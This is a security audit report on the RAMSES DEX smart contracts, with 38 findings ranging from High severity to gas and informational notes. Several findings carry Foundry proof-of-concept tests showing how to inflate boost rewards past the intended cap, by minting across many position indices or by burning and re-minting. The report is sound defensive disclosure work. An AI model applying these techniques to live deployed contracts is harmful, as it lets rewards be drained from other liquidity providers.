1. Minting with different position indices yields a higher total boostAmount than minting with the same index Severity: High Difficulty: n/a Type: n/a Target: n/a Description: When minting or burning the liquidityDelta is added to an existing position's liquidity to determine the newLiquidity which is used throughout _updatePosition() for various calculations, to include the veRamRatio and newBoostedLiquidity. Eventually a boostedLiquidityCap is calculated using the veRamRatio and hypotheticalLiquidity. This boostedLiquidityCap is intended to limit the amount of newBoostedLiquidity that can be added by a position. However, this can be bypassed by using many small positions rather than the same position. This can be done relatively simply by an attacker by using a different index for their positions, and since a veRamTokenId balance can be re-used by multiple positions, there is no detriment to using multiple positions to mint liquidity. See this POC illustrating the point in code: contract AttachTest is Test { RamsesV2Pool _pool; RamsesV2Factory _factory; MockVoter _voter; MockNFPManager _nfpManager; MockVotingEscrow _veRam; MockERC20 _token0; MockERC20 _token1; function setUp() public { _pool = new RamsesV2Pool(); _factory = new RamsesV2Factory(); _voter = new MockVoter(); _nfpManager = new MockNFPManager(); _veRam = new MockVotingEscrow(); _token0 = new MockERC20("0", "token_0", 18); _token1 = new MockERC20("1", "token_1", 18); deal(address(_token0), address(this), type(uint256).max); deal(address(_token1), address(this), type(uint256).max); _factory.initialize(address(_nfpManager), address(_veRam), address(_voter), address(0)); _pool.initialize(address(_factory), address(_nfpManager), address(_veRam), address(_voter), address(_token0), address(_token1), 10_000, 200); _pool.initialize(393495975901102234655829); } function ramsesV2MintCallback( uint256 amount0Owed, uint256 amount1Owed, bytes calldata data ) external { _token0.transfer(address(_pool), amount0Owed); _token1.transfer(address(_pool), amount1Owed); } function positionHash( address owner, uint256 index, int24 tickLower, int24 tickUpper ) internal pure returns (bytes32) { return keccak256(abi.encodePacked(owner, index, tickLower, tickUpper)); } function testMultipleAttachmentPOC() public { uint256 period = block.timestamp / (1 weeks); ( uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked ) = _pool.slot0(); int24 tickLower = tick - 132; int24 tickUpper = tick + 68; // get the boostAmount when using the same index to repeatedly mint for (uint i = 0; i < 10; i++) { _pool.mint(address(this), 0, tickLower, tickUpper, 100, 1, ""); } (uint128 boostAmountMintingSameIndex,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); // clear out all the state from this minting such that it doesn't affect the minting below. In essence, the two operations should functional independently of one another. _pool.burn(0, tickLower, tickUpper, 100 * 10, 1); _pool.collect(address(this), tickLower, tickUpper, uint128(_token0.balanceOf(address(_pool))), uint128(_token1.balanceOf(address(_pool)))); vm.startPrank(address(_pool)); _token0.transfer(address(this), _token0.balanceOf(address(_pool))); // clear the fee balances _token1.transfer(address(this), _token1.balanceOf(address(_pool))); vm.stopPrank(); skip(1 weeks); // skip forward a week to ensure the prior period's `totalVeRamAmount` doesn't affect this period's. period = period + 1; // get the boostAmount when using different indices to repeatedly mint uint128 boostAmountMintingDifferentIndices; for (uint i = 0; i < 10; i++) { _pool.mint(address(this), i+1, tickLower, tickUpper, 100, 2, ""); // the VotingEscrow contract is hard coded to return the same balanceOfNFT for every tokenId to illustrate the point. (uint128 boostAmountAccumulator,,,) = _pool.boostInfos(period, positionHash(address(this), i+1, tickLower, tickUpper)); boostAmountMintingDifferentIndices += boostAmountAccumulator; } // the boostAmount of all the differently indexed positions is > the boost amount when using the same position supplying the same liquidity assertGt(uint(boostAmountMintingDifferentIndices), uint(boostAmountMintingSameIndex)); } } Note that the pool in the POC has been initialized similarly to the deployed DEUS/USDC pool which can be found here. Also, note that the MockVotingEscrow contract has been hard coded to return the same balanceOfNFT() (the balance taken from the deployed veRAM contract for tokenId 1 at the time of the test) and isApproverOrOwner() for ease of testing and to illustrate the difference between the two minting strategies. function isApprovedOrOwner(address, uint256) external override view returns (bool) { return true; } function balanceOfNFT(uint256) external override view returns (uint256) { return 21487469130353205716474214; } 
2. Treasury fees can be bypassed with repeated calls to notifyRewardAmount() Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: Protocol fees are collected in the pushFees modifier when notifyRewardAmount() in GaugeV2.sol is called, which can be called by anyone at any time. FeeCollector.sol contract's collectProtocolFees() collects the pool's protocol fees and then uses the amount retrieved from the pool to calculate the treasury fee amount. 
3. boostAmount stays attached to a position after ownership is lost Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: When a veRamTokenId is attached to a position there is a check to ensure that the msg.sender isApprovedOrOwner of the veRamTokenId. If this check passes, the balance of the NFT is attached to the boostedPosition. However, if the ownership of the veRamTokenId changes, or the position owner is no longer approved, this veRamAmount stays attached to the boostedPosition indefinitely unless the veRamTokenId is explicitly changed, or the liquidity of the position goes to 0. 
4. Minting, burning, and minting yields higher boostAmount than minting Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: When minting a new position, the pool's token balances are used to determine hypotheticalLiquidity and therefore the boostedLiquidityCap, veRamBoostAvailable, and positionBoostUsedRatio. However, when a position is burned, the tokens continue to accrue to the pool until collect() is called by the burner. This means that even though the tokens may be allocated to the burner, and they can retrieve them at any time, they continue to contribute to the boostedLiquidityCap, veRamBoostAvailable, and positionBoostUsedRatio variables when positions are updated. This means that boostedLiquidityCap and veRamBoostAvailable can be inflated, and positionBoostUsedRatio deflated, to any value an attacker would like without supplying additional liquidity. See this POC illustrating the point in code: contract AttachTest is Test { RamsesV2Pool _pool; RamsesV2Factory _factory; MockVoter _voter; MockNFPManager _nfpManager; MockVotingEscrow _veRam; MockERC20 _token0; MockERC20 _token1; function setUp() public { _pool = new RamsesV2Pool(); _factory = new RamsesV2Factory(); _voter = new MockVoter(); _nfpManager = new MockNFPManager(); _veRam = new MockVotingEscrow(); _token0 = new MockERC20("0", "token_0", 18); _token1 = new MockERC20("1", "token_1", 18); deal(address(_token0), address(this), type(uint256).max); deal(address(_token1), address(this), type(uint256).max); vm.label(address(_pool), "_pool"); vm.label(address(_token0), "_token0"); vm.label(address(_token1), "_token1"); vm.label(address(_factory), "_factory"); vm.label(address(_veRam), "veRam"); vm.label(address(_nfpManager), "_nfpManager"); vm.label(address(_voter), "_voter"); _factory.initialize(address(_nfpManager), address(_veRam), address(_voter), address(0)); _pool.initialize(address(_factory), address(_nfpManager), address(_veRam), address(_voter), address(_token0), address(_token1), 10_000, 200); _pool.initialize(393495975901102234655829); } function tickSpacingToMaxLiquidityPerTick(int24 tickSpacing) public pure returns (uint128) { int24 minTick = (TickMath.MIN_TICK / tickSpacing) * tickSpacing; int24 maxTick = (TickMath.MAX_TICK / tickSpacing) * tickSpacing; uint24 numTicks = uint24((maxTick - minTick) / tickSpacing) + 1; return type(uint128).max / numTicks; } function testBurnAndMint() public { uint256 period = block.timestamp / (1 weeks); ( uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked ) = _pool.slot0(); int24 tickLower = tick - 132; int24 tickUpper = tick + 68; _pool.mint(address(this), 0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200), 1, ""); (uint128 boostAmountPreBurn,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); _pool.burn(0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200), 1); _pool.mint(address(this), 0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200), 1, ""); (uint128 boostAmountPostBurn,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); assertGt(uint(boostAmountPostBurn), uint(boostAmountPreBurn)); } } Note that the pool in the POC has been initialized similarly to the deployed DEUS/USDC pool which can be found here. Also, note that the MockVotingEscrow contract has been hard coded to return the same balanceOfNFT() (the balance taken from the deployed veRAM contract for tokenId 1 at the time of the test) and isApproverOrOwner() for ease of testing. function isApprovedOrOwner(address, uint256) external override view returns (bool) { return true; } function balanceOfNFT(uint256) external override view returns (uint256) { return 21487469130353205716474214; } 
5. Incorrect math in left() Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: The line calculating elapsedTime calculates the difference between _blockTimestamp(), with units of seconds, and period, with units of weeks. Subtracting weeks from seconds will result in a nonsensical result, so the two values must have the same units before the difference is calculated. 
6. The first mint in a pool gets 0 boostAmount regardless of veRamTokenId or liquidity supplied Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: The boostedLiquidityCap is based on the hypotheticalLiquidity which is based on the pool's token balances. When a pool is first deployed, it has no liquidity, so the first minter will receive no boostedLiquidity regardless of the size of their mint or veRamTokenId's balance. This is particularly acute if the minter is minting a large position as is illustrated in the POC below. See this POC for an illustration of the point in code: function testFirstMint() public { uint256 period = block.timestamp / (1 weeks); ( , int24 tick, , , , , ) = _pool.slot0(); int24 tickLower = tick - 132; int24 tickUpper = tick + 68; _pool.mint(address(this), 0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200) - 100, 1, ""); (uint128 boostAmountFirstMint,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); assertEq(uint256(boostAmountFirstMint), 0); _pool.mint(address(this), 1, tickLower, tickUpper, 100, 2, ""); // This could be a new minter, however we're using a different index and veRamTokenId for illustration purposes. (uint128 boostAmountSecondMintDifferentPosition,,,) = _pool.boostInfos(period, positionHash(address(this), 1, tickLower, tickUpper)); assertGt(uint256(boostAmountSecondMintDifferentPosition), 0); } 
7. GaugeV2.getPeriodReward() can skip lastClaimByToken for a valid claim Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: In function, GaugeV2.getPeriodReward(), consider the following: User wants to claim the reward for period = 13, current period = 14, and lastClaimByToken was made for all the tokens in period 10. That means the condition comes out to be 10 < period < 13. if ( period > lastClaimByToken[tokens[i]][_positionHash] && period < _blockTimestamp() / WEEK - 1 ) The period for which the rewards were claimed doesn't lie in the range. Hence, it skips the check and then moves on to the _getReward() call, which lets the user claim a reward for period 13, and lastClaimByToken remained 10. Well, it should be able to set the lastClaim to that period as it has been passed, and the user can claim the reward for that period later in the function. 
8. The rewards list can grow unbounded in GaugeV2.sol Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: notifyRewardAmount() is an external function, with no access control modifier, which means anyone can call notifyRewardAmount(). If a token has not been seen before, it is added to the isReward mapping and pushed into the rewards list. This means an attacker could fill the list with a large number of random token addresses. Elsewhere in GaugeV2.sol, such as getPeriodReward(), tokens are passed into the function such that the entire reward list is not iterated through. However, this is not the case in the RamsesRewards.sol contract's addressEarnedCl() function, where the entire reward list is iterated through. 
9. createCLGauge() code doesn't match comment Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: This comment and a line of code earlier in the function directly conflict with one another. require(_pool != address(0), "no pool"); ... // gov can create for any pool, even non-Ramses pairs By requiring _pool != address(0) value of true, governance is limited to only adding gauges to valid RAMSES pairs. This is in contrast to createGauge() for Ramses v1, where the equivalent check requiring isPair to be true is only applied to a non-governor msg.sender. 
10. Inconsistent first period in GaugeV2 Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: The firstPeriod variable is set during initialization as: firstPeriod = _blockTimestamp() / WEEK; This value will be rounded down. The end result of this value rounding down is the same whether the week of firstPeriod is 5% complete or 95% complete during initialization. This rounding down will artificially shorten the time period for the firstPeriod. This may skew the rewards per second during firstPeriod compared to future periods. 
11. Errors in left() Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: The NatSpec for left() references a function that does not exist, getTokenTotalSupplyByPeriod(). The NatSpec should be updated to remove this reference. The name of the function left() is misleading. The return value sees the elapsedTime value in the numerator, not the remaining time. This means that the return value of left() increases as the period approaches the end of the period, when the function name indicates that the opposite should be true. 
12. No validation of pool address in createGauge() Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: Like other contracts in RAMSES, RamsesV2GaugeFactory.sol is loosely based on UniswapV3Factory.sol, with the implementation of createGauge() based on createPool(). In Uniswap, anyone can create a pool between two ERC20 tokens. It is unclear whether the same should be true of createGauge(), but there is no access control enforced on this function. The pool address function argument is not verified as a RAMSES pool before it is passed to _deploy(), which also does not validate the pool address value. The result is that a gauge will exist with a pool address that is not a pool, and a malicious party can create a contract that implements the same interface as a RAMSES pool but does not necessarily perform the same actions. There are external calls to the pool address in GaugeV2.sol (such as 1, 2, 3) that may be leveraged into an attack vector, though the specifics have not been fully worked out yet. 
13. v1 Gauge.sol poke() should cache length before loop Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: Gauge.poke() should cache rewards.length before the for loop, then reference the cache length value in the loop, to achieve gas savings. Otherwise the length of the rewards state variable is checked on each iteration of the loop. This finding was automatically identified by slither. 
14. _find_time_user_epoch() loop iterations can be reduced Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: VotingEscrow.vy in Curve has a function find_block_epoch() which implements binary search using a for loop that repeats 128 times. RAMSES has a similar VotingEscrow._find_time_user_epoch() function that implements binary search using a for loop that repeats 256 times. The RAMSES VotingEscrow._find_time_user_epoch() implementation is in contrast to the RAMSES implementation of VotingEscrow._balanceOfAtNFT(), which loops 128 times like Curve. There is no need for VotingEscrow._find_time_user_epoch() to loop 256 times, it can stop at 128. 
15. Move logic into if statement Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: _supplied is only needed in the if branch, so it can be set inside that branch. function _updateFor(address _gauge) internal { address _pool = poolForGauge[_gauge]; - uint256 _supplied = weights[_pool]; uint256 _supplyIndex = supplyIndex[_gauge]; // only new pools will have 0 _supplyIndex if (_supplyIndex > 0) { + uint256 _supplied = weights[_pool]; uint256 _index = index; // get global index0 for accumulated distro 
16. periodSecondsPerBoostedLiquidityOutsideBeforeX128 and periodSecondsPerLiquidityOutsideBeforeX128 are 0 and can be removed from subtraction Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: In cross() periodSecondsPerLiquidityOutsideBeforeX128 and periodSecondsPerBoostedLiquidityOutsideBeforeX128 must be 0 for the if logic to be executed. In this case, their subtraction does nothing to contribute to the final periodSecondsPerLiquidityOutsideX128 and periodSecondsPerBoostedLiquidityOutsideX128 values. 
17. ERC721PermitUpgradeable inherits from Initializable twice Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: ERC721PermitUpgradeable inherits from Initializable explicitly. However, ERC721Upgradeable already inherits from Initializable. 
18. positionLiquidity - params.liquidity is calculated twice Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: position.liquidity is stored as positionLiquidity - params.liquidity. This is recomputed to check if the liquidity difference is 0 and unset the veRamTokenId. 
19. Gas can be saved calling a different periodEarned() in GaugeV2.sol Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: Currently, in earned() periodEarned(period, token, tokenId) is called to accumulate the reward. This periodEarned() function re-computes the tickLower and tickUpper which are already known at the time periodEarned() is called in earned(). 
20. Restrict reward claim for current epoch Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Since all the important (rewards deciding) variables for the current epoch get set at the start of the next epoch, it is crucial to not let the user claim the reward for the current epoch. Additionally, the reward that the user is claiming for the current week turns out to be an arbitrary value calculated using a fixed value of boostedInRange as 1 WEEK. Even if the user claims the reward for the current week, his/her rewards are still accumulating which the user can't claim as those rewards become available in the next epoch. Then it is better to restrict users to claim rewards for the current epoch. 
21. initialize should emit event for variable set Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Ideally, the following should trigger events. FeeCollector.initialize() should emit TreasuryChanged. RamsesV2Factory.initialize() should emit ImplementationChanged 
22. _switchAttachment shouldn't allow switch if position.liquidity == 0 Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Once a user decreases all the liquidity from its nfpManager position, the veRamTokenId from both the pool and nfpManager position gets detached (becomes 0). But if the user calls _switchAttachment it will set veRamTokenId in nfpManager, but in the pool, the user attachedVeRamId remains zero. (nfpManager.switchAttachment() -> pool.burn() -> _updateLiquidity() which only updates veRamTokenId, if newLiquidity > 0). This can make the pool and nfpManager contract out of sync for a user position. 
23. Incorrect NatSpec comment in ProtocolActions Library Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: CollectProtocol event is emitted when feeCollector calls the collectProtocol function of RamsesV2Pool.sol, as the function has a modifier onlyFeeCollector which means it can only be called by feeCollector. 
24. Revert doesn't contain error message Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Revert statement reverts without error message in the following functions. RamsesV2Pool.sol: onlyFeeCollector() mint() RamsesV2Factory.sol: enableFeeAmount() NonfungiblePositionManager.sol: tokenURI() decreaseLiquidity() SwapRouter.sol: ramsesV2SwapCallback() exactOutputInternal() 
25. inconsistency in preventing implementation initialization Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: There needs to be more consistent behavior in the constructor of implementation contracts. The following contracts use _disableInitializers(); to disable initialization of implementation (which is good): GuageV2.sol FeeCollector.sol RamsesLens.sol But other contracts follow constructor() initializer {} (which does the same thing, but it is recommended to use _disableInitializers for implementations) 
26. Imports are unused Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Various imports throughout the codebase are not used and can be removed. The IWETH9.sol import in SwapRouter.sol. The SqrtPriceMath.sol, IRamsesV2PoolDeployer.sol, IVotingEscrow.sol, and IVoter.sol imports in RamsesV2Pool.sol. RamsesPool.sol in RamsesV2Factory.sol. IGaugeV2.sol in RamsesV2GaugeFactory.sol. 
27. Contract without proxy can be simplified Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Several proxy artifacts in RamsesDeployer.sol can be modified because it is not behind a proxy: The file imported from @openzeppelin/contracts-upgradeable can be changed to the @openzeppelin/contracts version of the file. Initializer is not necessary. initialize() can be replaced by the contract constructor. 
28. Whitelisted tokens for gauges cannot be removed Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: There is no way to reverse the action of the whitelist() operation in Voter.sol. If there is a token that should be removed from the whitelist, the Voter contract (which is deployed behind a proxy) may need to be replaced. Adding a function to reverse the whitelisting of tokens can improve the mitigation of future threats if a trusted token contract is maliciously or incompatibly upgraded. 
29. Emergency council identical to governor in Voter.sol Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Voter.sol has a governor role and an emergencyCouncil role. In the on-chain contract, the same RAMSES multisig is set for these two different roles. In other Solidly fork implementations with the emergencyCouncil role, such as Velodrome on Optimism and PearlFi on Polygon, these roles are assigned to different multisigs. Specifically, the emergencyCouncil multisig has a higher threshold than the governance multisig, suggesting a design choice where controlling the uptime of the protocol requires cooperation from more signers than adding gauges to the protocol. This is a design choice and RAMSES may have decided that the current approach is best, but without clear documentation on this choice, the current settings make the RAMSES multisig a centralized source of power over the full protocol. 
30. On-chain contracts using different library versions Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Some of the on-chain code does not match the contract versions reviewed during this audit. Specifically, the on-chain Oracle.sol deployment at 0xf70c9C4F6281C0750d68da8878894b1235cb6020 has some minor differences in 3 dependencies, States.sol, LiquidityMath.sol, and Tick.sol, compared to the code reviewed in this audit. Similarly, Tick.sol deployed at 0xc989D669831Cd5258369CB0Dce7752CbfE7303E8 and ProtocolActions.sol deployed at 0xa67f82621540017a679153423CA0B8a1b4518B49 have different versions of the State.sol library dependency compared to the version of State.sol in this audit. 
31. Reduce rounding error inaccuracy Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: The two division operations can be reduced to one to minimize error created by the rounding down inherent in a solidity division operation. function rewardRate(address token) external view returns (uint256) { uint256 period = _blockTimestamp() / WEEK; - return (tokenTotalSupplyByPeriod[period][token] * 4) / 10 / WEEK; + return (tokenTotalSupplyByPeriod[period][token] * 4) / (10 * WEEK); } 
32. Beacon proxy inconsistency Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: RamsesV2PoolDeployer uses the value keccak256(abi.encode()) for the beacon proxy creation while RamsesV2GaugeDeployer uses keccak256(abi.encodePacked()). These contracts perform almost the exact same task, so the same code logic should be used. 
33. STATES_SLOT can accidentally match a known pre-image Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: By calculating STATES_SLOT = keccak256("states.storage") using a string value, the first pre-image of STATES_SLOT is known ("states.storage"), which makes it accidentally match the known pre-image ("states.storage"). Openzeppelin and all proxy standards derive their custom storage slot in this way. Ref 
34. First period has default zero value for startTick and previousPeriod Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: The implementation of RamsesV2Pool._advancePeriod() primarily updates the values for states.periods[_lastPeriod], or the state of the last period. Only one line of code updates the current period value. Because _advancePeriod() is first called in initialize(), the initial _lastPeriod value of zero will be meaningless, but it will have no values set for startTick and previousPeriod, so these values will remain zero. The first real period is the 1st period (not the 0th period). Any loop that iterates through the period states should consider this, but there is no comment to clarify this is how the period values are handled. 
35. Forked Uniswap v3 code uses OZ 3.4.1 not 3.4.2 Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: The changes made between 3.4.2 and 3.4.1 are minimal, which just one commit made in TimelockController, which is not directly used in the v2-periphery/ directory. However, if the goal is to maintain maximum similarity to the original Uniswap, this dependency on OpenZeppelin in the v2-periphery/ directory should be upgraded to OZ 3.4.2. 
36. Improve naming choices Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Several naming choices that could be improved include: RamsesV2Pool.sol has two functions named "initialize". The second function sets the initial price for the pool and may be better named "setInitialPoolPrice" to avoid confusion. The function name "initialize" is generally used for a single function in an implementation contract sitting behind a proxy. This function can only be called once and sets initial values similar to how a constructor would work in a non-proxy context. But in RamsesV2Pool.sol, the second initialize function can be called more than once because it lacks an initializer modifier. PeripheryUpgradeable.sol is a renamed version of PeripheryImmutableState.sol in Uniswap v3. The interface for PeripheryUpgradeable.sol still has the original name of IPeripheryImmutableState.sol, which does not match the contract implementing the interface file. PeripheryUpgradeable.sol is a modified version of Uniswap's PeripheryImmutableState.sol. But the interface that is implemented in the RAMSES file is not renamed to match the contract name. Instead, the original IPeripheryImmutableState interface name remains. Although out of scope, the _gauges function argument in Voter.initialize() would be better named _gaugefactory, because the variable name _gauges is used elsewhere in the contract to refer to a different variable. 
37. Remove library functions that are never used Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: checkTicks() is declared at the end of Tick.sol but is never called. The only place where the code acknowledges this function is a comment in collect() with the word "checkTicks". checkTicks() could be called in RamsesV2Pool.snapshotCumulativesInside() to replace the existing tick checks, but this may only make sense if checkTicks() gets called in more than one location. 
38. RamsesV2Pool view functions don't return all struct values Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: One specific example of this is ticks() that does not return: cleanUnusedSlot cleanUnusedSlot2 periodSecondsPerLiquidityOutsideX128 periodSecondsPerBoostedLiquidityOutsideX128 Another example is boostInfos(uint256, bytes32) which returns values from a BoostInfo struct but does not return secondsPerLiquidityPeriodStartX128 or secondsPerBoostedLiquidityPeriodStartX128. A third example is observations() which returns all values from the Observation struct except for boostedInRange. 
